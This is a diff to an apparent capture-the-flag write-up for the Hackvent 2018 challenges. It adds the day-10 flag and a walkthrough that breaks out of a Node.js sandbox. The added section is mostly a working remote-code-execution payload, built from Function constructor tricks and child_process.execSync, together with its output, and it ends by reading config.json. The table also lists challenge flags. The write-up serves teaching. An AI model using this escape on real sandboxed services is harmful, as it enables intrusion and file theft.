@@ -19,7 +19,7 @@ Title                                             | Category    | Points | Flag
 [December 7 ](#day-07-flappy.pl)                  | Easy        | 2/1    | `HV18-bMnF-racH-XdMC-xSJJ-I2fL`
 [December 8 ](#day-08-advent-snail)               | Medium      | 3/2    | `HV18-$$nn-@@11-LLr0-B1ne`
 [December 9 ](#day-09-fake-xmass-balls)           | Medium      | 3/2    | `HV18-PpTR-Qri5-3nOI-n51a-42gJ`
-[December 10](#day-10-run-node-run)               | Medium      | 3/2    | `HV18-`
+[December 10](#day-10-run-node-run)               | Medium      | 3/2    | `HV18-YtH3-S4nD-bx5A-Nt4G`
 [December 11](#day-11-)                           | Medium      | 3/2    | `HV18-`
 [December 12](#day-12-)                           | Medium      | 3/2    | `HV18-`
 [December 13](#day-13-)                           | Medium      | 3/2    | `HV18-`
@@ -1118,7 +1118,7 @@ app.listen(port);
 
 So the value we want is in a variable with a random name `flag_<64randomchars>`. So we either need to get it to spit out all variable names, or break out of the sandbox and print `boiler`, hmmm
 
-Some inputs and outputs that might help:
+We play around a bit but nothing obvious:
 
 ```
 >> eval(6+6)
@@ -1191,8 +1191,54 @@ Some inputs and outputs that might help:
 'WebAssembly' ]
 ```
 
-link: https://github.com/gf3/sandbox/issues/29
+Then we find this github issue discussing vulnerabilities in this method of sandboxing: https://github.com/gf3/sandbox/issues/50
 
+So we can get RCE by inputting the following:
+
+```
+>>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("pwd")
+
+{ type: 'Buffer', data: [ 47, 97, 112, 112, 10 ] }
+```
+
+We see that something is returned, but the output isn't very useful to us, so we set the child process to inherit stdio from parent by setting `{stdio: 'inherit'}`
+
+```
+>>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("pwd", {stdio: 'inherit'})
+
+JSON Error (data was "/app
+{"result":"null","console":[]}")
+```
+
+That's better! Now let's just read the config file since that will contain our flag:
+
+
+```
+>>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("ls", {stdio: 'inherit'})
+
+JSON Error (data was "config.json
+config.json~
+docker-compose.yaml
+dockerfile
+dockerfile~
+index.html
+main.js
+node_modules
+package-lock.json
+package.json
+run.js
+{"result":"null","console":[]}")
+
+>>> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("child_process").execSync("cat config.json", {stdio: 'inherit'})
+
+JSON Error (data was "{
+"flag":"HV18-YtH3-S4nD-bx5A-Nt4G",
+"port":3000
+}
+
+{"result":"null","console":[]}")
+
+```
 
 **Flag**
 ```
